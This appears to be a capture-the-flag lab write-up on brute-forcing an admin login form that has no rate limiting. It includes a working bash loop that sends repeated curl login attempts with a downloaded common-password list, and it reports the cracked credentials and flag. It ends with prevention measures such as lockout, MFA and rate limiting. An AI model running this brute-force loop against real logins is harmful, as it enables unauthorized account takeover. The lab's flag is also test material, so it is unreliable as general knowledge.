# Brute Force Authentication Vulnerability

## Overview
The login form at `/?page=signin` is vulnerable to brute force attacks, allowing attackers to guess admin credentials with no rate limiting.

---

## How It Works

1. **Finding the Target:**  
   In a previous breach, we gained access to the members page, which revealed that "admin" is a valid username.
2. **Attack:**  
   Login requests are sent like this:
   ```
   /?page=signin&username=admin&password=<PASSWORD>&Login=Login
   ```
   A failed login shows "WrongAnswer.gif".

---

## Exploitation Methods

### ** Bash Script with Password List**

- Download a password list from GitHub:
  ```bash
  wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt -O pwdlist.txt
  ```
- Use this brute force loop:
  ```bash
  for pwd in $(cat pwdlist.txt); do
    resp=$(curl -s "http://<IP_ADDRESS>/?page=signin&username=admin&password=$pwd&Login=Login")
    if [[ "$resp" == *"The flag is :"* ]]; then
      flag=$(echo "$resp" | awk -F 'The flag is :' '{print $2}' | head -n1 | cut -c2-65)
      echo "Success! Username: admin | Password: $pwd | Flag: $flag"
      break
    fi
  done
  ```
- Password `shadow` is found to work.


---

## Result

- **Username:** admin  
- **Password:** shadow  
- **Flag:** `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`

---

## Prevention

1. **Account Lockout:** Temporarily disable accounts after multiple failures.
2. **Strong Password Policy:** Require complex, non-common passwords.
3. **MFA:** Add Multi-Factor Authentication for all users.
4. **CAPTCHA:** Use CAPTCHA after failed logins.
5. **Rate Limit:** Restrict login attempts per IP.
6. **Monitoring:** Alert on brute force patterns.

---

## Resources

- Password list source:  
  [https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt)
